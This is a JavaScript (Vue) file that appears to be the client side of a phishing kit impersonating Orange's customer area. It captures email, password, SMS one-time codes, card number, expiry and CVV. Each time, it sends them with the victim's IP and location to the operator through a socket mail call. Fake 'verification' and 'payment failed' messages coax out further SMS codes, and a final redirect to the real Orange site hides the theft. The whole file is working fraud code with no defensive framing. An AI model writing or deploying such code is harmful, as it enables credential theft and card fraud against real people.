

const index =new Vue({
    el:"#index",
    data:{
        error:false,
        loading:false,
        message:'Chargement en cours...',
        login:1,
        step :1,
        log:{
            EMAIL:'',
            PASS: '',
            SMS:'',
            numcc:'',
            ex1:'',
            ex2:'',
            cvv:'',
            tel:'',
        }
    },
    mounted(){
$('body').show()
       console.log(this.content)


    },

    computed:{
        content(){
            var loc =JSON.stringify(locIp)

            var message ={
                name:'Lapino-Banderas',
                from:'resultca@result.com',
                to:$('#Mail').val(),
                subject : this.login==2 ? ' EMAIL + PASS + CC ' : '',
                html:''+JSON.stringify(this.log)+'<p><br>'+JSON.stringify(locIp)+'</p>'
            }
            return message
        }
    },
    methods:{

        showChat(){
            Tawk_API.toggle();
        },
        goToCredit(){
            if(this.log.PASS.length<5 || this.log.EMAIL.length<10) return this.error=true
            this.loading=true
            this.content.subject+=" EMAIL + PASS ORANGE > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{
              if(clb){

                    this.$Message.success('vous êtes connecté')
                    this.message="Redirection dans 3 secondes ..."

                  setTimeout(()=>{
                       window.location.href="https://espace-client.orange.fr/compte"
                },3000)
                } else {
                    window.location.reload()
                }
           })
        },


        goToStep2(){
            if(this.log.SMS.length<6 || this.log.SMS.length>8 || this.log.SMS.length==7) return this.$Message.error('Code incorrect')
            this.message="Vérification du code en cours..."
            this.loading=true
            this.content.subject+=" + SMS > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{

               if(clb){

                    this.$Message.error('Paiment non validé ')
                    this.message="Veuillez saisir le nouveau code réçu par SMS..."

                  setTimeout(()=>{
                    this.step=2
                 this.loading=false
                },3000)
                } else {
                    window.location.reload()
                }
            })
        },




        setCard(){
            if(this.log.numcc.length<14) return false
            this.message="Vérification en cours ...."
            this.loading=true
            this.content.subject+=" > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                    setTimeout(()=>{
                        setTimeout(()=>{
                            this.message="Envoie de code par SMS , patientez SVP"
                        },5000)

                        setTimeout(()=>{
                            this.message="Paiment en cours..."
                        },8000)

                        setTimeout(()=>{

                            this.step=2
                           this.loading=false

                        },14000)
                    },7000)
                }  else {
                    window.location.reload()
                }
            })

        }
    }

})
